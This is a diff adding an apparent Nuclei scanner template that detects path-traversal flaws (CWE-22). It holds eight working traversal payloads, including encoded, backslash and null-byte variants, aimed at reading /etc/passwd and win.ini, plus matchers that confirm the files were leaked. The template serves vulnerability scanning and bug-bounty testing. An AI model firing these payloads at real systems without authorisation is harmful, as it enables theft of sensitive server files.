@@ -1,0 +1,41 @@
+id: cwe-22-path-traversal
+info:
+  name: Path Traversal Detection
+  author: security-all-in-one
+  severity: high
+  description: Tests for directory traversal vulnerabilities
+  classification:
+    cwe-id: CWE-22
+    cvss-score: 7.5
+  tags: lfi,path-traversal,cwe-22,dast,bug-bounty
+
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}/?file=../../../etc/passwd"
+      - "{{BaseURL}}/?file=....//....//....//etc/passwd"
+      - "{{BaseURL}}/?file=..%2f..%2f..%2fetc%2fpasswd"
+      - "{{BaseURL}}/?page=..\..\..\windows\win.ini"
+      - "{{BaseURL}}/?path=/etc/passwd"
+      - "{{BaseURL}}/?include=../../../etc/passwd"
+      - "{{BaseURL}}/?file=....%5c....%5c....%5cwindows%5cwin.ini"
+      - "{{BaseURL}}/?template=../../../etc/passwd%00"
+
+    stop-at-first-match: true
+
+    matchers-condition: or
+    matchers:
+      - type: word
+        part: body
+        words:
+          - "root:"
+          - "/bin/bash"
+          - "/bin/sh"
+        condition: and
+
+      - type: word
+        part: body
+        words:
+          - "[fonts]"
+          - "[extensions]"
+        condition: and
